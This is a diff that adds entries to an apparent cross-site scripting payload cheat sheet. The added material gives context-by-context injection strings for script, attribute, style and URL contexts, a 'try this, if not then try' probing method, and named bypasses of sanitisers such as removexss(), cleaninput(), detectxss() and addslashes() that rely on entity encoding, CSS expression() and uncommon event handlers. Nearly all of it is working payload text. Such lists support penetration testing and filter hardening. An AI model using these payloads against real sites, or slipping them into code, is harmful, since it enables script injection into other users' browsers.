@@ -35,6 +35,8 @@ data:text/html;base64,PHNjcmlwdD5jb25maXJtKGRvY3VtZW50LmRvbWFpbik8L3NjcmlwdD4= /
 <svg id=alert(1) onload=eval(id)>
 <svg onload=(alert)(1) >
 <frameset onload=alert(1)> 
+<ahref=javascript&colon;confirm(1);>click</a>
+<iframe/src="data:text/html,<svg%09%0A%0B%0C%0D%A0%00%20onload=confirm(1);>">
                                                        
 /*To bypass input values*/
 
@@ -121,10 +123,180 @@ data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
 
 
 
+
+
 /*Bypass addslashes()*/
 
 "' onmouseover=alert(1) a= '"
 
 
+
+
+
+
+
+
 /*Bypass filters using US-Encoding (IE 6 & 7 only)*/
+
 ¼script¾alert(¢xss¢)¼/script¾
+
+
+
+
+
+
+/*
+For script contexts like
+
+<script> var x = "INJECTION_HERE"; </script>
+
+OR
+
+<script> var x = 'INJECTION_HERE'; </script>
+*/
+
+Try ";confirm(1);" or "; confirm(1); //,
+
+ if not then try ';confirm(1); //,
+
+ if not then try </script><script>alert(1)</script>.
+
+If all fail, then it's not vulnerable.
+
+
+
+
+
+
+/*
+For attribute contexts like
+
+<div class="INJECTION_POINT"> stuff here </div>
+
+OR
+
+<div class='INJECTION_POINT'> stuff here </div>
+*/
+
+Try " onmouseover="alert(1),
+
+if not then try 'onmouseover='alert(1),
+
+if not then try `` onmouseover=alert(1) (Works in IE8), 
+
+if not then it's not vulnerable.
+
+
+
+
+
+
+
+
+/*
+For style contexts like
+
+<div style="INJECTION_POINT"> stuff here </div>
+
+OR
+
+<div style='INJECTION_POINT'> stuff here </div>
+
+(WORKS FOR IE ONLY)
+*/
+
+Try widt:expression(alert(1)),
+
+if not try width:exp/**/ression(alert(1)),
+
+if not try width&#x3A;expre/**/ssion&#x28;alert&#x28;1&#x29&#x29,
+
+if not try width:expression\28 alert \28 1 \29 \29,
+
+if not then it's not vulnerable.
+
+
+
+
+/*HTML context bypasses of removexss()*/
+
+<input type=text oninput=alert(1)>
+
+<form action=ja&Tab;vasc&NewLine;ript&colon;alert&lpar;1&rpar;><button type=submit>
+
+
+
+
+
+
+/*Attribute context bypasses of removexss()*/
+
+Use onpopstate, onstorage, onshow, or any eventhandlers that aren't blacklisted.
+
+<div ontouchstart=alert(1)>hello</div> /* Mobile only*/
+
+<body onpopstate=alert(1)></body>
+
+<video onprogress=alert(1)><source src=http://www.w3schools.com/tags/mov_bbb.ogg type=video/ogg></video>
+
+
+
+
+
+
+/*Style context bypass of removexss()*/
+
+width:exp/**/ression(alert(1))
+
+
+
+
+
+
+
+/*URL context bypass of removexss()*/
+
+ja&Tab;vasc&NewLine:ript&colon;alert&lpar;1&rpar;
+
+
+
+
+
+
+
+
+/*Script context bypass of removexss()*/
+
+&#x27;; confirm(1); &#x27;
+
+
+&#39;; confirm(1); &#39;
+
+
+
+
+
+/*HTML context bypasses of cleaninput()*/
+
+
+<img src=x id=confirm(1) onerror=eval(id)
+
+<iframe/src=javascript:confirm%281%29
+
+
+
+/*Style context bypass for cleaninput()*/
+
+width:expression&#x28;alert&#x28;1&#x29;&#x29;
+
+
+
+
+/*HTML context bypass of detectxss()*/
+
+<form/action=ja&Tab;vascr&Tab;ipt&colon;confirm(1)>
+<button/type=submit>
+
+<math><a/xlink:href=javascript&colon;confirm&lpar;1&rpar;>click
+
+
